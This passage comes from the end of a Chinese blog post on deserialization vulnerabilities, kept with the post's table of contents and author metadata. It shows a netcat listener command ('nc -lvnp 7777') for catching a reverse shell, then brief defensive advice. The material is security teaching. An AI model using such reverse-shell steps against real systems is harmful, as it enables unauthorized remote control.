作用：将远程主机发送的数据作为本地Shell的输入，实现双向通信。</span><br></pre></td></tr></table></figure>\n\n<p>再用ssh连接服务器，监听一下端口 我这里是7777</p>\n<p>nc -lvnp 7777</p>\n<h4 id=\"lt-五-gt-反序列化防护\"><a href=\"#lt-五-gt-反序列化防护\" class=\"headerlink\" title=\"&lt;五&gt;反序列化防护\"></a>&lt;五&gt;反序列化防护</h4><ul>\n<li>应该尽量避免用户输入反序列化的参数</li>\n<li>如果确实需要对不受信任的数据源进行反序列化，需要确保数据未被篡改，比如使用<strong>数字签名来检查数据的完整性</strong></li>\n<li>严格<strong>控制</strong>反序列化相关<strong>函数的参数</strong>，坚持用户所输入的信息都是不可靠的原则</li>\n<li><strong>做好代码审计</strong>相关工作，提高开发人员的安全意识</li>\n</ul>\n","text":"反序列化漏洞 未对反序列化的输入数据做合法性校验，导致攻击者可以控制反序列化的内容。 <一>序列化serialize() 将对象（内存中的数据结构或状态）转换为...","permalink":"/post/反序列化漏洞","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[{"name":"漏洞","slug":"漏洞","count":1,"path":"api/categories/漏洞.json"}],"tags":[{"name":"Web安全","slug":"Web安全","count":4,"path":"api/tags/Web安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">反序列化漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%B8%80-gt-%E5%BA%8F%E5%88%97%E5%8C%96serialize\"><span class=\"toc-text\">&lt;一&gt;序列化serialize()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%BA%8C-gt-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96unserialize\"><span class=\"toc-text\">&lt;二&gt;反序列化unserialize()</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">1.thinkphp反序列化</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%B8%89-gt-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0%EF%BC%9A\"><span class=\"toc-text\">&lt;三&gt;php反序列化魔法函数：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">一、中间件反序列化漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">1.jboss反序列化</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">2.WebLogic反序列化</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-tomcat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">3.tomcat反序列化</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">二、框架漏洞反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%B8%80-gt-JNDI\"><span class=\"toc-text\">&lt;一&gt;  JNDI</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%BA%8C-gt-RMI\"><span class=\"toc-text\">&lt;二&gt;  RMI</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%B8%89-gt-lookup%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">&lt;三&gt; lookup函数</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E5%9B%9B-gt-LADP\"><span class=\"toc-text\">&lt;四&gt;  LADP</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">1.shiro550反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">1.原理：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">2.相关知识</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3-%E5%88%A4%E6%96%AD%EF%BC%9A\"><span class=\"toc-text\">3.判断：</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">2.fastjson反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-1-%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">1.1 原理：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-2-%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81%EF%BC%9A\"><span class=\"toc-text\">1.2 指纹特征：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">1.3 漏洞利用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-springboot%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E7%BB%BF%E5%8F%B6%EF%BC%89\"><span class=\"toc-text\">3.springboot反序列化（绿叶）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%8E%9F%E7%90%86%EF%BC%9A-1\"><span class=\"toc-text\">1.原理：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">2.漏洞利用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-log4j%E4%B8%8Elog4j2%E7%9A%84%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">4.log4j与log4j2的关系</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#5-log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">5.log4j2反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1-%E5%8E%9F%E7%90%86%EF%BC%9A-2\"><span class=\"toc-text\">1.原理：</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1\"><span class=\"toc-text\">2.漏洞利用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#lt-%E4%BA%94-gt-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%98%B2%E6%8A%A4\"><span class=\"toc-text\">&lt;五&gt;反序列化防护</span></a></li></ol></li></ol></li></ol>","author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"渗透测试基础","uid":"8078ed964e83057be24c1271b3514329","slug":"渗透测试","date":"2025-07-22T13:00:00.000Z","updated":"2025-09-20T05:40:43.201Z","comments":true,"path":"api/articles/渗透测试.json","keywords":null,"cover":"/images/d.jpg","text":"渗透测试一、什么是渗透测试？渗透测试（Penetration Testing，简称“渗透测试”或“PenTest”）是一种模拟攻击的安全评估方法，旨在发现系统、...","permalink":"/post/渗透测试","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[{"name":"渗透基础","slug":"渗透基础","count":1,"path":"api/categories/渗透基础.json"}],"tags":[{"name":"渗透","slug":"渗透","count":1,"path":"api/tags/渗透.json"}],"author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"网安基础知识","uid":"52578dceeb148ed4d1a3fb12873d5ab1","slug":"网安常用知识","date":"2025-07-16T08:00:00.000Z","updated":"2025-09-20T05:40:43.203Z","comments":true,"path":"api/articles/网安常用知识.json","keywords":null,"cover":"/images/c.jpg","text":"网安常用知识一、Linux安全基础 Linux 是最常用于服务器的操作系统之一，在网络安全中扮演着重要角色。它的安全性依赖于许多方面，包括文件权限、用户管理、网...","permalink":"/post/网安常用知识","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"网安基础","slug":"网安基础","count":4,"path":"api/categories/网安基础.json"}],"tags":[{"name":"Web安全","slug":"Web安全","count":4,"path":"api/tags/Web安全.json"}],"author":{"name":"归尘aliez","slug":"blog-author","avatar":"/images/guichen.jpg","link":"/","description":"<p>斩断昔日旧枷锁，今日方知我是我</p>Journey of a thousand miles begins with single step.","socials":{"github":"https://github.com/gcaliez","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}